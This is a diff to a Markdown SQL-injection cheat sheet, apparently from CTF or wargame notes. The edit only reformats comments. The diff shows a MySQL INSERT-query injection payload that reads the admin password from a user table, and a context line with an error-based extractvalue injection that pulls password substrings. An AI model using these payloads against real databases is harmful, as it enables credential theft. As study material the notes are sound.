@@ -25,13 +25,14 @@ admin' AND extractvalue(null, concat(0x23, ( SELECT substring(upw, 21, 100) from
 ## MySQL Insert query injection
 
 ~~~ sql
-insert into tmitter_board(idx, id, msg, etc) values (0, 'guest', 'hello', 0); -- example
+-- example
+insert into tmitter_board(idx, id, msg, etc) values (0, 'guest', 'hello', 0);
 
-asdf1234', null), (0, 'admin', (select ps from tmitter_user where id='admin'), 0)# -- payload
+-- payload
+asdf1234', null), (0, 'admin', (select ps from tmitter_user where id='admin'), 0)#
 
-insert into tmitter_board(idx, id, msg, etc) values (0, 'asdf1234', null), (0, 'admin', (select ps from tmitter_user where id='admin'), 0)#', 'hello', 0); -- result
-
-
+-- result
+insert into tmitter_board(idx, id, msg, etc) values (0, 'asdf1234', null), (0, 'admin', (select ps from tmitter_user where id='admin'), 0)#', 'hello', 0); 
 ~~~
 
 <br>
